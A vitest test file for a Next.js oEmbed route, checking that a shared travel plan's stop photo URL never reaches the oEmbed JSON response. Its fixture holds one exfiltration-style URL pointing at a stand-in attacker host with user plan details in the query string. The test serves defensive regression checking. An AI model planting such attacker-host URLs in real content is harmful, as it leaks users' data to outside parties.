import { describe, it, expect, vi } from 'vitest'
import { NextRequest } from 'next/server'

// Gate 2 F-A-pub (TP10) — the oEmbed route reads through the same public loader and does not emit plan stop photos at all (its
// thumbnail is the per-share OG card). This pins that scope, with the real handler and loader; nothing in oEmbed was changed.

const EXFIL = 'https://attacker.example/p?d=QuanBinhThanh_budget200k'
const stored = {
  id: 'id-1', slug: 'AbCdEfGh12', query: 'q', domain: 'travel', locale: 'vi', og_version: 2, view_count: 0, ask_count: 0,
  created_at: '2026-10-01T00:00:00.000Z', parent_id: null, owner_is_anonymous: false,
  payload: {
    v: 1, title: 'Đà Lạt 2 ngày', query: 'lên kế hoạch Đà Lạt', domain: 'travel', locale: 'vi', body: 'Kế hoạch.', buttons: [], images: [], suggestedQuestions: [], createdAt: '2026-10-01T00:00:00.000Z',
    plan: { type: 'trip', title: 'Đà Lạt 2 ngày', days: [{ label: 'Ngày 1', items: [{ time: '08:00', emoji: '🍜', category: 'food', name: 'Quán A', photo_url: EXFIL }] }] },
  },
}
vi.mock('@/lib/supabase/admin', () => ({
  createAdminClient: () => {
    const chain = { select: () => chain, eq: () => chain, maybeSingle: async () => ({ data: JSON.parse(JSON.stringify(stored)), error: null }) }
    return { from: () => chain }
  },
}))
vi.mock('@/lib/security/publicRateLimit', () => ({
  publicDailyRateLimit: async () => ({ ok: true, retryAfter: 0, scope: 'instance' }),
  publicRateLimit: async () => ({ ok: true, retryAfter: 0, scope: 'instance' }),
}))

import { GET } from './route'

const req = (qs: string) => new NextRequest(new Request(`https://www.tappyai.com/api/oembed${qs}`), {})

describe('F-A-pub · GET /api/oembed (TP10)', () => {
  it('answers for the public page and carries no plan stop photo', async () => {
    const res = await GET(req('?url=https%3A%2F%2Fwww.tappyai.com%2Fr%2FAbCdEfGh12&format=json'))
    expect(res.status).toBe(200)
    const text = await res.text()
    expect(text).not.toContain('attacker.example')
    expect(JSON.parse(text).thumbnail_url).toMatch(/\/r\/AbCdEfGh12\/og\.png\?v=2$/)
  })
})
